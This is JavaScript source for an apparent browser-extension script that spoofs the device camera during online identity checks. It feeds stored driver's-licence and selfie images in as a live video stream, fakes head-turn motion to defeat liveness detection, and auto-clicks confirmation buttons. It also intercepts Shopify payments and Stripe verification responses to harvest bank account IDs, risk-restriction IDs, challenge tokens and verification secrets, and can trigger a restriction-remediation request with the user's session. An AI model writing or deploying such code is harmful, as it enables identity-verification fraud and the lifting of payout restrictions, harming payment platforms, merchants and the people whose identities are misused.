// MAIN world — document_start — patches camera BEFORE any page script runs

;(function IDVPatcher() {

// Safe sessionStorage (sandboxed iframes throw SecurityError)
function ssGet(k)    { try { return sessionStorage.getItem(k) }  catch(_) { return null } }
function ssSet(k, v) { try { sessionStorage.setItem(k, v) }      catch(_) {} }

// ── Image store ───────────────────────────────────────────────────────────────
ssSet('__idv_phase__', 'id') // always reset to id on page load
const IDV = {
  dlFront:    ssGet('__idv_dl_front__'),
  dlBack:     ssGet('__idv_dl_back__'),
  selfies:    [ssGet('__idv_selfie_0__'), ssGet('__idv_selfie_1__'), ssGet('__idv_selfie_2__')].filter(Boolean),
  phase:      'id',  // always start with ID — switch to selfie via DOM watcher
  idStep:     0,
  camActive:  false,
  currentImg: null,  // live canvas reference for mid-stream image swap
  adjZoom:    1.08,  // user-controlled scale multiplier
  adjOffX:    0,     // user-controlled X offset (pixels)
  adjOffY:    0      // user-controlled Y offset (pixels)
}

window.addEventListener('message', ev => {
  if (ev.source !== window) return
  const d = ev.data
  if (d?._idv === 'IDV_SET') {
    if (d.dlFront)         IDV.dlFront  = d.dlFront
    if (d.dlBack)          IDV.dlBack   = d.dlBack
    if (d.selfies?.length) IDV.selfies  = d.selfies
    if (d.phase)           IDV.phase    = d.phase
    console.log('[IDV] Images received. dlFront=' + !!IDV.dlFront + ' selfies=' + IDV.selfies.length)
    updateBadge()
  }
  if (d?._idv === 'IDV_SWITCH') {
    IDV.phase  = d.phase  ?? IDV.phase
    IDV.idStep = d.idStep ?? IDV.idStep
    ssSet('__idv_phase__', IDV.phase)
    console.log('[IDV] Manual switch → phase=' + IDV.phase + ' idStep=' + IDV.idStep)
    showToast('⬡ IDV: Switched to ' + (IDV.phase === 'selfie' ? 'Selfie' : IDV.idStep === 1 ? 'ID Back' : 'ID Front'), '#1e3a5f')
    if (IDV.camActive) loadImg(pickSrc()).then(img => { if (img) IDV.currentImg = img })
  }
  if (d?._idv === 'IDV_ADJUST') {
    if (d.zoom  !== undefined) IDV.adjZoom = d.zoom
    if (d.offX  !== undefined) IDV.adjOffX = d.offX
    if (d.offY  !== undefined) IDV.adjOffY = d.offY
  }
})

function pickSrc() {
  if (IDV.phase === 'selfie') return IDV.selfies[0] || IDV.dlFront
  return IDV.idStep === 1 ? (IDV.dlBack || IDV.dlFront) : IDV.dlFront
}

// ── On-screen badge ───────────────────────────────────────────────────────────
let badge = null
function initBadge() {
  if (badge || !document.body) return
  badge = document.createElement('div')
  badge.style.cssText = 'position:fixed;bottom:10px;right:10px;z-index:2147483647;' +
    'padding:4px 12px;border-radius:20px;font-size:11px;font-family:monospace;font-weight:700;' +
    'pointer-events:none;transition:background .3s,color .3s;box-shadow:0 2px 8px rgba(0,0,0,.5)'
  document.body.appendChild(badge)
  updateBadge()
}
function updateBadge() {
  if (!badge) return
  if (IDV.camActive) {
    badge.style.background = '#052005'; badge.style.color = '#4ade80'
    badge.style.border = '1px solid #14532d'; badge.textContent = '⬡ IDV CAM ACTIVE'
  } else if (IDV.dlFront) {
    badge.style.background = '#030d2d'; badge.style.color = '#60a5fa'
    badge.style.border = '1px solid #1d4ed8'; badge.textContent = '⬡ IDV READY'
  } else {
    badge.style.background = '#1a0505'; badge.style.color = '#f87171'
    badge.style.border = '1px solid #7f1d1d'; badge.textContent = '⬡ IDV NO IMAGE'
  }
}
function showToast(msg, bg) {
  if (!document.body) return
  const t = document.createElement('div')
  t.style.cssText = 'position:fixed;top:14px;left:50%;transform:translateX(-50%);z-index:2147483647;' +
    'padding:8px 20px;border-radius:8px;font-size:12px;font-family:monospace;font-weight:700;' +
    'color:#fff;background:' + (bg||'#1e3a5f') + ';box-shadow:0 3px 14px rgba(0,0,0,.6);pointer-events:none'
  t.textContent = msg
  document.body.appendChild(t)
  setTimeout(() => t.remove(), 3500)
}
if (document.body) initBadge()
else document.addEventListener('DOMContentLoaded', initBadge)

// ── Load image helper — converts base64 → Blob URL to bypass CSP data: block ──
function b64ToBlob(dataUrl) {
  try {
    const [header, b64] = dataUrl.split(',')
    const mime = header.match(/:(.*?);/)[1]
    const bin  = atob(b64)
    const arr  = new Uint8Array(bin.length)
    for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i)
    return URL.createObjectURL(new Blob([arr], { type: mime }))
  } catch(e) {
    console.log('[IDV] b64ToBlob error:', e.message)
    return null
  }
}

function loadImg(src) {
  return new Promise(resolve => {
    if (!src) return resolve(null)
    const img = new Image()
    img.onload  = () => resolve(img)
    img.onerror = () => { console.log('[IDV] ✗ Image onerror — CSP or bad data?'); resolve(null) }
    setTimeout(() => { console.log('[IDV] ✗ Image timeout'); resolve(null) }, 6000)
    // Convert base64 → blob URL to bypass Shopify CSP (blocks data: URLs)
    if (src.startsWith('data:')) {
      const blobUrl = b64ToBlob(src)
      console.log('[IDV] Using blob URL:', !!blobUrl)
      img.src = blobUrl || src
    } else {
      img.src = src
    }
  })
}

// ── Build fake video stream ───────────────────────────────────────────────────
async function buildFakeStream(src) {
  console.log('[IDV] Building stream, src length=' + (src?.length || 0))
  const img = await loadImg(src)
  if (!img) { console.log('[IDV] ✗ No image'); return null }
  console.log('[IDV] Image loaded: ' + img.naturalWidth + 'x' + img.naturalHeight)

  const W = 1280, H = 720
  const canvas = document.createElement('canvas')
  canvas.width = W; canvas.height = H
  const ctx = canvas.getContext('2d')

  IDV.currentImg = img
  let ox = 0, oy = 0, sc = 1, vx = 0.15, vy = 0.1, vs = 0.0001
  const streamStart = performance.now()

  // ── Liveness helper: returns current yaw angle for selfie phase ──────────
  // Sequence (loops): 2s straight → 1.5s turn left → 1s hold left →
  //                   1.5s turn right → 1s hold right → 1s return straight
  function livenessYaw() {
    const CYCLE = 8000  // ms per full loop
    const t = (performance.now() - streamStart) % CYCLE
    // t ranges:
    //   0–2000   : straight (0°)
    //   2000–3500 : ease to -28° (look left)
    //   3500–4500 : hold -28°
    //   4500–6000 : ease to +28° (look right)
    //   6000–7000 : hold +28°
    //   7000–8000 : ease back to 0°
    if (t < 2000) return 0
    if (t < 3500) { const p = (t-2000)/1500; return -28 * easeInOut(p) }
    if (t < 4500) return -28
    if (t < 6000) { const p = (t-4500)/1500; return -28 + 56 * easeInOut(p) }
    if (t < 7000) return 28
    { const p = (t-7000)/1000; return 28 * (1 - easeInOut(p)) }
  }
  function easeInOut(t) { return t < .5 ? 2*t*t : -1+(4-2*t)*t }

  function draw() {
    const ci = IDV.currentImg || img
    const baseScale = Math.min(W / ci.naturalWidth, H / ci.naturalHeight) * IDV.adjZoom
    ox += vx; oy += vy; sc += vs
    if (Math.abs(ox) > 8)   vx *= -1
    if (Math.abs(oy) > 5)   vy *= -1
    if (sc > 1.018 || sc < 0.982) vs *= -1
    const s = baseScale * sc

    ctx.fillStyle = '#111'
    ctx.fillRect(0, 0, W, H)

    if (IDV.phase === 'selfie') {
      // ── Liveness mode: simulate 3D head turn via perspective skew ──────
      const yawDeg = livenessYaw()
      const yawRad = yawDeg * Math.PI / 180
      // cos(yaw) compresses X axis to simulate horizontal rotation
      const xScale = Math.cos(yawRad)
      // slight Y shift: head tilts slightly up when turning (natural motion)
      const yShift = Math.abs(yawDeg) * 0.6
      const iw = ci.naturalWidth * s, ih = ci.naturalHeight * s
      const cx = W/2 + IDV.adjOffX, cy = H/2 + IDV.adjOffY - yShift

      ctx.save()
      ctx.translate(cx, cy)
      ctx.scale(xScale, 1)
      ctx.drawImage(ci, -iw/2 + ox, -ih/2 + oy, iw, ih)
      ctx.restore()
    } else {
      // ── ID card mode: gentle float, no rotation ─────────────────────────
      ctx.drawImage(ci,
        (W - ci.naturalWidth*s)/2  + ox + IDV.adjOffX,
        (H - ci.naturalHeight*s)/2 + oy + IDV.adjOffY,
        ci.naturalWidth*s, ci.naturalHeight*s)
    }

    // Vignette
    const g = ctx.createRadialGradient(W/2, H/2, H*.32, W/2, H/2, H*.72)
    g.addColorStop(0, 'rgba(0,0,0,0)'); g.addColorStop(1, 'rgba(0,0,0,0.2)')
    ctx.fillStyle = g; ctx.fillRect(0, 0, W, H)
  }
  draw()

  let stream, stopFn

  // Try MediaStreamTrackGenerator (Chrome 94+)
  if (typeof MediaStreamTrackGenerator !== 'undefined' && typeof VideoFrame !== 'undefined') {
    try {
      const gen = new MediaStreamTrackGenerator({ kind: 'video' })
      const writer = gen.writable.getWriter()
      let alive = true
      async function pump(ts) {
        if (!alive) return
        draw()
        const vf = new VideoFrame(canvas, { timestamp: Math.floor(ts * 1000), duration: 33333 })
        try { await writer.write(vf) } catch(_) {}
        vf.close()
        requestAnimationFrame(pump)
      }
      requestAnimationFrame(pump)
      stream = new MediaStream([gen])
      stopFn = () => { alive = false; try { writer.close() } catch(_) {} }
      console.log('[IDV] ✓ MediaStreamTrackGenerator')
    } catch(e) { console.log('[IDV] TrackGenerator failed:', e.message); stream = null }
  }

  // Fallback: canvas.captureStream
  if (!stream) {
    const iv = setInterval(draw, 33)
    stream = canvas.captureStream(30)
    stopFn = () => clearInterval(iv)
    console.log('[IDV] ✓ canvas.captureStream')
  }

  // Spoof track metadata
  const track = stream.getVideoTracks()[0]
  if (track) {
    track.getSettings     = () => ({ width:W, height:H, frameRate:30, facingMode: IDV.phase==='selfie'?'user':'environment', deviceId:'idv-cam', groupId:'idv-grp' })
    track.getCapabilities = () => ({ width:{min:1,max:1920}, height:{min:1,max:1080}, frameRate:{min:1,max:60} })
    track.getConstraints  = () => ({})
    const origStop = track.stop.bind(track)
    track.stop = () => { stopFn?.(); origStop(); IDV.camActive = false; updateBadge() }
  }

  IDV.camActive = true
  updateBadge()
  return stream
}

// ── CAMERA HOOK — Triple-layer override ──────────────────────────────────────
const _realMD  = navigator.mediaDevices
const _origGUM = _realMD?.getUserMedia?.bind(_realMD)
const _origED  = _realMD?.enumerateDevices?.bind(_realMD)

if (_origGUM) {
  const fakeGUM = async function fakeGetUserMedia(constraints) {
    console.log('[IDV] getUserMedia CALLED! video=' + !!constraints?.video)
    if (!constraints?.video) return _origGUM(constraints)
    // Always start with DL Front when camera opens — DOM watcher switches to selfie later
    IDV.phase = 'id'
    IDV.idStep = 0
    ssSet('__idv_phase__', 'id')

    // Wait up to 8s for images
    for (let i = 0; i < 40; i++) {
      if (IDV.dlFront) break
      const ss = ssGet('__idv_dl_front__')
      if (ss) { IDV.dlFront = ss; break }
      await new Promise(r => setTimeout(r, 200))
    }
    console.log('[IDV] dlFront available:', !!IDV.dlFront)

    const src = pickSrc()
    if (!src) {
      showToast('⬡ IDV: Upload DL image first!', '#7f1d1d')
      return _origGUM(constraints)
    }

    showToast('⬡ IDV: Injecting fake camera…', '#1e3a5f')
    const fake = await buildFakeStream(src)
    if (!fake) {
      showToast('⬡ IDV: Stream failed — real camera', '#7f1d1d')
      return _origGUM(constraints)
    }

    showToast('⬡ IDV: FAKE CAMERA ACTIVE!', '#052e16')
    return fake
  }

  const fakeED = async function() {
    const real = await _origED().catch(() => [])
    if (!real.some(d => d.kind === 'videoinput')) {
      real.unshift({ deviceId:'idv-cam', groupId:'idv-grp', kind:'videoinput', label:'IDV Virtual Camera', toJSON(){ return this } })
    }
    return real
  }

  // LAYER 1: Replace navigator.mediaDevices with Proxy (strongest)
  try {
    Object.defineProperty(navigator, 'mediaDevices', {
      get() {
        return new Proxy(_realMD, {
          get(t, p) {
            if (p === 'getUserMedia')    return fakeGUM
            if (p === 'enumerateDevices') return fakeED
            const v = t[p]; return typeof v === 'function' ? v.bind(t) : v
          }
        })
      },
      configurable: true
    })
    console.log('[IDV] ✓ Layer 1: navigator.mediaDevices Proxy installed')
  } catch(e) { console.log('[IDV] Layer 1 failed:', e.message) }

  // LAYER 2: Prototype override
  if (typeof MediaDevices !== 'undefined') {
    try {
      Object.defineProperty(MediaDevices.prototype, 'getUserMedia', {
        get() { return fakeGUM }, set() {}, configurable: true
      })
      console.log('[IDV] ✓ Layer 2: MediaDevices.prototype patched')
    } catch(e) { console.log('[IDV] Layer 2 failed:', e.message) }
  }

  // LAYER 3: Legacy global APIs
  try { navigator.getUserMedia       = (c,s,e) => fakeGUM(c).then(s).catch(e) } catch(_) {}
  try { navigator.webkitGetUserMedia = (c,s,e) => fakeGUM(c).then(s).catch(e) } catch(_) {}

  // ImageCapture override
  if (typeof ImageCapture !== 'undefined') {
    const _OIC = ImageCapture
    window.ImageCapture = class {
      constructor(track) { this._t = track; this._r = new _OIC(track) }
      async grabFrame() {
        const i = await loadImg(pickSrc()); if (!i) return this._r.grabFrame()
        return createImageBitmap(i)
      }
      async takePhoto(o) {
        const i = await loadImg(pickSrc()); if (!i) return this._r.takePhoto(o)
        const c = document.createElement('canvas')
        c.width = i.naturalWidth; c.height = i.naturalHeight
        c.getContext('2d').drawImage(i, 0, 0)
        return new Promise(r => c.toBlob(r, 'image/jpeg', 0.95))
      }
      get track() { return this._t }
      getPhotoCapabilities() { return this._r.getPhotoCapabilities?.() }
      getPhotoSettings()     { return this._r.getPhotoSettings?.() }
    }
  }

  console.log('[IDV] ✓ All camera layers active on', location.hostname)
} else {
  console.log('[IDV] No mediaDevices on this page')
}

// ── Phase + auto-click DOM watcher ────────────────────────────────────────────
const SELFIE_W  = ['selfie','your face','look at the camera','photo of yourself','center your face','take a photo of your face']
const BACK_W    = ['back of your','flip your','other side','back side','reverse side','back of the']
const ADVANCE_W = ['looks good','use this photo','captured','✓ captured','photo captured']
const CLICK_W   = ['looks good','use this photo','use photo','confirm','continue','next','submit','done']

let _lastTxt = ''
function checkDOM() {
  const txt = document.body?.innerText?.toLowerCase() || ''
  if (txt === _lastTxt) return
  _lastTxt = txt

  // Only switch phases when camera is ACTIVE (not before camera opens)
  if (!IDV.camActive) return

  if (IDV.phase === 'id' && IDV.idStep === 0 && BACK_W.some(w => txt.includes(w))) {
    IDV.idStep = 1; console.log('[IDV] → back-of-ID')
    loadImg(pickSrc()).then(img => { if (img) IDV.currentImg = img })
  }
  if (IDV.phase !== 'selfie' && SELFIE_W.some(w => txt.includes(w))) {
    IDV.phase = 'selfie'; ssSet('__idv_phase__', 'selfie')
    window.postMessage({ _idv: 'IDV_PHASE_REQUEST', phase: 'selfie' }, '*')
    console.log('[IDV] → selfie phase')
    loadImg(pickSrc()).then(img => { if (img) IDV.currentImg = img })
  }
  if (ADVANCE_W.some(w => txt.includes(w))) setTimeout(autoClick, 900)
}
function autoClick() {
  const btns = [...document.querySelectorAll('button,[role="button"]')].filter(b => !b.disabled && b.offsetParent)
  for (const phrase of CLICK_W) {
    const b = btns.find(b => b.textContent?.toLowerCase().trim().includes(phrase))
    if (b) { console.log('[IDV] Auto-click:', b.textContent.trim()); b.click(); return }
  }
}
function watchDOM() {
  if (!document.body) { document.addEventListener('DOMContentLoaded', watchDOM); return }
  new MutationObserver(checkDOM).observe(document.body, { childList:true, subtree:true, characterData:true })
  checkDOM()
}
watchDOM()

// ── Fetch interceptor ─────────────────────────────────────────────────────────
const FPAT = ['banking_home_banking','payments/banking','shopify/graphql','verificationhub.shopify.com','verify.stripe.com']
function getStore() { return location.pathname.match(/\/store\/([^/?#]+)/)?.[1] ?? null }
function gid(g) { return g ? (String(g).match(/\/(\d+)$/)?.[1] ?? String(g)) : null }

function parseCaptures(url, data) {
  const o = {}
  if (url.includes('banking_home_banking') || url.includes('payments/banking')) {
    const ba = data.bankAccount || data?.data?.bankAccount
    if (ba?.id) { o.bank_account_id = gid(ba.id); o.bank_account_gid = ba.id }
    const act = (ba?.riskRestrictions||[]).find(r => r.status==='ACTIVE')
    if (act) { o.active_restriction_id = gid(act.id); o.active_restriction_gid = act.id; o.active_restriction_status = 'ACTIVE' }
    const pr = data.principal || data?.data?.principal
    if (pr?.id) o.principal_id = gid(pr.id)
  }
  if (url.includes('shopify/graphql') || url.includes('verificationhub')) {
    const d = data.data || {}
    if (d.payoutGateRemediate?.challengeToken)    { o.jwt = d.payoutGateRemediate.challengeToken; o.jwt_type = 'pgrr' }
    if (d.remediateRiskRestriction?.challengeToken){ o.jwt = d.remediateRiskRestriction.challengeToken; o.jwt_type = 'remediate' }
    for (const k of Object.keys(d)) {
      if (k.startsWith('createIVA')||k.startsWith('createIdentityVerification')) {
        const vs = d[k]?.verificationSession
        if (vs) { o.ek = vs.id; o.ek_client_secret = vs.clientSecret; o.assessment_ref = vs.referenceId; o.civa_variant = k; break }
      }
    }
    if (d.createAssessment?.assessmentReference) o.vhub_assessment_ref = d.createAssessment.assessmentReference
    const bh = d.shopifyPaymentsAccount?.bankAccount || d.bankAccount
    if (bh?.riskRestrictions !== undefined) o.discharge_detected = !bh.riskRestrictions.some(r => r.status==='ACTIVE')
  }
  if (url.includes('verify.stripe.com') && (data.session||data).status) o.stripe_session_status = (data.session||data).status
  return Object.keys(o).length ? o : null
}

function sendCapture(url, data) {
  const c = parseCaptures(url, data)
  if (c) window.postMessage({ _idv:'CAPTURE', store:getStore(), url, captures:c, timestamp:Date.now() }, '*')
}

window.addEventListener('message', async ev => {
  if (ev.source !== window || ev.data?._idv !== 'FORCE_VERIFY') return
  const csrf = document.querySelector('meta[name="csrf-token"]')?.content || window?.Shopify?.csrfToken || ''
  const mut = `mutation RemediateIDV($id:ID!){remediateRiskRestriction(input:{riskRestrictionId:$id}){challengeToken userErrors{field message}}}`
  try {
    const res = await _origFetch('https://admin.shopify.com/api/shopify/graphql.json', {
      method:'POST', credentials:'include',
      headers:{'Content-Type':'application/json',...(csrf?{'X-CSRF-Token':csrf}:{})},
      body:JSON.stringify({operationName:'RemediateIDV',query:mut,variables:{id:ev.data.riskRestrictionId}})
    })
    const data = await res.json()
    sendCapture('shopify/graphql', data)
    const rrr = data?.data?.remediateRiskRestriction
    window.postMessage({ _idv:'FORCE_VERIFY_RESULT', result: rrr?.challengeToken ? {ok:true} : {ok:false,error:rrr?.userErrors?.map(e=>e.message).join(',')||'error'} }, '*')
  } catch(e) { window.postMessage({ _idv:'FORCE_VERIFY_RESULT', result:{ok:false,error:String(e)} }, '*') }
})

const _origFetch = window.fetch.bind(window)
window.fetch = async function(input, init) {
  const res = await _origFetch(input, init)
  const url = typeof input === 'string' ? input : input?.url || ''
  if (FPAT.some(p => url.includes(p))) res.clone().json().then(d => sendCapture(url, d)).catch(() => {})
  return res
}

})()
